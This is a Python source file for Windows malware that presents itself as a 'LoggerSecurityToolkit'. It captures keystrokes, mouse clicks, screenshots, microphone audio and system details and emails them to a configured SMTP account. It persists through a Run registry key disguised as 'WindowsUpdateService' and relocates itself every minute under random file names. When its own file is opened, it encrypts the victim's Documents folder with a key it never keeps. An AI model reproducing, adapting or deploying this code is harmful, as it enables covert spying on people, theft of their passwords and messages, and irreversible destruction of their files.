import os
import platform
import socket
import smtplib
import threading
import wave
import time
import random
import string
import shutil
import sys
from datetime import datetime
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders

# Windows registry for auto-start
try:
    import winreg
except ImportError:
    pass  # Not Windows or no access

# Dependency check and install
try:
    import sounddevice as sd
    from pynput import keyboard, mouse
    import pyscreenshot as ImageGrab
    from cryptography.fernet import Fernet
except ModuleNotFoundError:
    import subprocess
    subprocess.check_call([sys.executable, "-m", "pip", "install", "pynput", "pyscreenshot", "sounddevice", "cryptography"])
    import sounddevice as sd
    from pynput import keyboard, mouse
    import pyscreenshot as ImageGrab
    from cryptography.fernet import Fernet

# CONFIGURATION - Change these before running
EMAIL_ADDRESS = "YOUR_EMAIL@example.com"
EMAIL_PASSWORD = "YOUR_PASSWORD"
SMTP_SERVER = "smtp.mailtrap.io"
SMTP_PORT = 2525
SEND_INTERVAL = 60  # seconds
MOVE_INTERVAL = 60  # seconds
ENCRYPTION_TARGET_DIR = os.path.join(os.environ['USERPROFILE'], 'Documents')  # Encrypt files here on trigger

# Globals for file monitoring
last_access_time = None
access_check_interval = 5  # seconds

def add_to_startup(script_path):
    try:
        pythonw = sys.executable.replace("python.exe", "pythonw.exe")
        if not os.path.exists(pythonw):
            pythonw = sys.executable  # fallback

        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                             r"Software\Microsoft\Windows\CurrentVersion\Run",
                             0, winreg.KEY_SET_VALUE)

        name = "WindowsUpdateService"  # stealthy name
        cmd = f'"{pythonw}" "{script_path}"'

        winreg.SetValueEx(key, name, 0, winreg.REG_SZ, cmd)
        winreg.CloseKey(key)
    except Exception as e:
        print(f"Failed to add to startup: {e}")

class LoggerSecurityToolkit:
    def __init__(self, email, password, interval):
        self.log = ""
        self.email = email
        self.password = password
        self.interval = interval
        self.log_file = f"keylog_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
        self.lock = threading.Lock()

    def append_log(self, data):
        with self.lock:
            self.log += data

    def save_to_file(self):
        with open(self.log_file, 'a', encoding='utf-8') as file:
            file.write(self.log)
        self.log = ""

    def send_email(self, subject, message, attachment_path=None):
        try:
            msg = MIMEMultipart()
            msg['From'] = self.email
            msg['To'] = self.email
            msg['Subject'] = subject

            msg.attach(MIMEText(message, 'plain'))

            if attachment_path and os.path.exists(attachment_path):
                with open(attachment_path, 'rb') as f:
                    part = MIMEBase('application', 'octet-stream')
                    part.set_payload(f.read())
                    encoders.encode_base64(part)
                    part.add_header('Content-Disposition', f'attachment; filename={os.path.basename(attachment_path)}')
                    msg.attach(part)

            with smtplib.SMTP(SMTP_SERVER, SMTP_PORT) as server:
                server.login(self.email, self.password)
                server.send_message(msg)
        except Exception as e:
            print(f"[ERROR] Email not sent: {e}")

    def report(self):
        self.save_to_file()
        self.send_email("Keylogger Report", "See attached logs.", self.log_file)
        timer = threading.Timer(self.interval, self.report)
        timer.daemon = True
        timer.start()

    def keypress_handler(self, key):
        try:
            self.append_log(f'{key.char}')
        except AttributeError:
            self.append_log(f'[{key}]')

    def mouse_click_handler(self, x, y, button, pressed):
        if pressed:
            self.append_log(f"\n[Mouse Click] at ({x},{y}) with {button}\n")

    def collect_sys_info(self):
        info = f"""
[System Info]
Hostname: {socket.gethostname()}
IP Address: {socket.gethostbyname(socket.gethostname())}
Platform: {platform.system()} {platform.release()}
Processor: {platform.processor()}
Machine: {platform.machine()}
"""
        self.append_log(info)

    def capture_screenshot(self):
        img = ImageGrab.grab()
        screenshot_file = f"screenshot_{int(time.time())}.png"
        img.save(screenshot_file)
        self.send_email("Screenshot Captured", "See attached screenshot.", screenshot_file)
        os.remove(screenshot_file)

    def record_microphone(self):
        fs = 44100
        seconds = 10
        audio_file = f"recording_{int(time.time())}.wav"

        try:
            recording = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
            sd.wait()
            with wave.open(audio_file, 'wb') as f:
                f.setnchannels(2)
                f.setsampwidth(2)
                f.setframerate(fs)
                f.writeframes(recording.tobytes())
            self.send_email("Mic Audio", "Recorded audio attached.", audio_file)
        finally:
            if os.path.exists(audio_file):
                os.remove(audio_file)

    def start(self):
        self.collect_sys_info()
        self.report()

        with keyboard.Listener(on_press=self.keypress_handler) as k_listener, \
             mouse.Listener(on_click=self.mouse_click_handler) as m_listener:
            k_listener.join()
            m_listener.join()

# --- Self-move and restart logic ---

def random_dir():
    candidates = [
        os.environ.get('TEMP', 'C:\\Windows\\Temp'),
        os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'Temp'),
        os.path.join(os.environ['USERPROFILE'], 'Documents'),
        os.path.join(os.environ['USERPROFILE'], 'Downloads'),
        os.path.join(os.environ['USERPROFILE'], 'Desktop'),
    ]
    return random.choice(candidates)

def random_filename(length=8):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length)) + ".py"

def move_and_restart(script_path):
    try:
        new_dir = random_dir()
        if not os.path.exists(new_dir):
            os.makedirs(new_dir)
        new_path = os.path.join(new_dir, random_filename())
        shutil.copy2(script_path, new_path)
        os.startfile(new_path)
        try:
            os.remove(script_path)
        except Exception:
            pass
        sys.exit(0)
    except Exception as e:
        print(f"Error moving script: {e}")

def periodic_move(script_path, interval):
    while True:
        time.sleep(interval)
        move_and_restart(script_path)

# --- File access detection (polling) ---

def file_accessed_recently(path, last_checked):
    try:
        access_time = os.path.getatime(path)
        return access_time > last_checked
    except Exception:
        return False

def monitor_file_access(path, on_access_callback, check_interval=5):
    global last_access_time
    last_access_time = os.path.getatime(path)
    while True:
        time.sleep(check_interval)
        if file_accessed_recently(path, last_access_time):
            last_access_time = os.path.getatime(path)
            on_access_callback()

# --- Encryption logic ---

def generate_key():
    return Fernet.generate_key()

def encrypt_file(file_path, key):
    fernet = Fernet(key)
    try:
        with open(file_path, 'rb') as file:
            original = file.read()
        encrypted = fernet.encrypt(original)
        with open(file_path, 'wb') as file:
            file.write(encrypted)
    except Exception as e:
        print(f"Failed to encrypt {file_path}: {e}")

def encrypt_files_in_dir(directory, key):
    for root, _, files in os.walk(directory):
        for file in files:
            full_path = os.path.join(root, file)
            if full_path.endswith('.py') or full_path.endswith('.txt'):
                continue
            encrypt_file(full_path, key)

def on_file_access():
    key = generate_key()
    encrypt_files_in_dir(ENCRYPTION_TARGET_DIR, key)

# --- Main execution ---

if __name__ == "__main__":
    script_path = os.path.abspath(sys.argv[0])

    # Add to startup silently
    add_to_startup(script_path)

    # Start periodic move in background thread
    move_thread = threading.Thread(target=periodic_move, args=(script_path, MOVE_INTERVAL), daemon=True)
    move_thread.start()

    # Start file access monitor in background thread
    monitor_thread = threading.Thread(target=monitor_file_access, args=(script_path, on_file_access, access_check_interval), daemon=True)
    monitor_thread.start()

    # Start keylogger
    logger = LoggerSecurityToolkit(EMAIL_ADDRESS, EMAIL_PASSWORD, SEND_INTERVAL)
    logger.start()
